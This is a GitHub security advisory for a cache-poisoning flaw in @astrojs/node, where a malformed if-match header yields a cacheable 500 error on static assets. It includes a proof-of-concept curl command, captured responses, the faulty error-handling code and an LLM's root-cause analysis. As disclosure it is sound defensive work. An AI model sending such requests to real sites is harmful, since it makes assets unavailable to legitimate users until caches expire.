# [M] Astro: Cache Poisoning due to incorrect error handling when if-match header is malformed 

## Summary
Severity: Medium
Advisory: GHSA-c57f-mm3j-27q9
CVE: CVE-2026-41322
CWE: CWE-525
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-04-23
Source: https://github.com/advisories/GHSA-c57f-mm3j-27q9
Type: github-advisory

## Affected
- npm: `@astrojs/node` — affected >=0 <10.0.5

## Details
### Summary
Requesting a static JS/CSS resource from the `_astro` path with an incorrect or malformed `if-match` header returns a `500` error with a one-year cache lifetime instead of `412` in some cases. As a result, all subsequent requests to that file — regardless of the `if-match` header — will be served a 5xx error instead of the file until the cache expires.

Sending an incorrect or malformed `if-match` header should always return a `412` error without any cache headers, which is not the current behavior.

### Affected Versions
- `astro@5.14.1`
- `@astrojs/node@9.4.4`

### Proof of Concept

Run the following command:

```
curl -s -o /dev/null -D - <host location>/_astro/_slug_.UTbyeVfw.css -H "if-match: xxx"
```

If a 5xx error is not returned, inspect the resources via the browser's web inspector and select another CSS/JS file to request until a 5xx error is returned. The behavior generally defaults to a 5xx response. Note that all static files are immutable, so the cache must be purged or disabled to reproduce reliably.

A response similar to the following is expected from CloudFront:

```
HTTP/2 500 
content-type: text/html
content-length: 166541
date: Thu, 09 Apr 2026 12:53:08 GMT
last-modified: Wed, 21 Jan 2026 13:40:08 GMT
etag: "a68349e96c2faf8861c330aeb548441a"
x-amz-server-side-encryption: AES256
accept-ranges: bytes
server: AmazonS3
x-cache: Error from cloudfront
via: 1.1 3591be88662e5675a9dc1cc4e0a9c392.cloudfront.net (CloudFront)
x-amz-cf-pop: ZRH55-P2
x-amz-cf-id: Rg--RIYCKcA55GZqZXdvu-VTvpxBFFVzV4LBIcKq5pB_hktcrhYbKg==
```

The above is not the real server output but the AWS error response triggered when the pods return a 5xx. Below is the output of the same `curl` command issued directly against a pod in Kubernetes:

```
❯ curl -s -o /dev/null -D - -H "Host: tagesanzeiger.ch" 127.0.0.1:3333/_astro/InstallPrompt.astro_astro_type_script_index_0_lang.C0M4llHG.js -H "if-match: xxx"

HTTP/1.1 500 Internal Server Error
Cache-Control: public, max-age=31536000, immutable
Accept-Ranges: bytes
Last-Modified: Tue, 07 Apr 2026 07:08:03 GMT
ETag: W/"560-19d66c50c38"
Content-Type: text/javascript; charset=utf-8
Date: Tue, 07 Apr 2026 08:23:54 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked
```

This demonstrates that the pod itself returns a `5xx` error instead of `412`. In addition, the response includes a `Cache-Control: public, max-age=31536000, immutable` header.

Because the testing setup configures `if-match` as part of the cache key, the exploit no longer affects the production application. Prior to that change, the CDN Point of Presence would become cache-poisoned, and any client visiting the affected pages without cached files through the same PoP would receive broken pages. This was reproduced by creating test URLs and visiting them in a browser only after triggering the exploit. The exploited resources returned `5xx` errors instead of the original CSS/JS content, breaking the application.

### Details
The findings were analyzed with an LLM, which identified the following file as the likely source: [serve-static.ts](https://github.com/withastro/astro/blob/main/packages/integrations/node/src/serve-static.ts)

```js
// Lines 129-153

let forwardError = false;

stream.on('error', (err) => {
    if (forwardError) {
        console.error(err.toString());
        res.writeHead(500);
        res.end('Internal server error');
        return;
    }
    // File not found, forward to the SSR handler
    ssr();
});
stream.on('headers', (_res: ServerResponse) => {
    // assets in dist/_astro are hashed and should get the immutable header
    if (normalizedPathname.startsWith(`/${app.manifest.assetsDir}/`)) {
        // This is the "far future" cache header, used for static files whose name includes their digest hash.
        // 1 year (31,536,000 seconds) is convention.
        // Taken from https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control#immutable
        _res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
    }
});
stream.on('file', () => {
    forwardError = true;
});
stream.pipe(res);
```

LLM analysis:

> `send` handles conditional request headers such as `If-Match` internally. When a file is found but the precondition fails (ETag mismatch), `send`:
>
> 1. Emits `file` (the file exists) → `forwardError = true`
> 2. Emits `headers` → `Cache-Control: public, max-age=31536000, immutable` is set on `res`
> 3. Emits `error` with a `PreconditionFailedError` (status 412)
>
> However, the error handler does not inspect the error's status code:
>
> ```js
> stream.on('error', (err) => {
>     if (forwardError) {
>         console.error(err.toString());
>         res.writeHead(500);   // ← always 500, regardless of the actual error
>         res.end('Internal server error');
>         return;
>     }
>     ssr();
> });
> ```
>
> Because `Cache-Control` was already set during the `headers` event, the response is sent as:
>
> ```
> HTTP/1.1 500 Internal Server Error
> Cache-Control: public, max-age=31536000, immutable
> ```


### Impact
**Cache Poisoning** — An attacker can force edge servers to cache an error page instead of the actual content, rendering one or more assets unavailable to legitimate users until the cache expires.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-c57f-mm3j-27q9
- https://nvd.nist.gov/vuln/detail/CVE-2026-41322
- https://github.com/withastro/astro
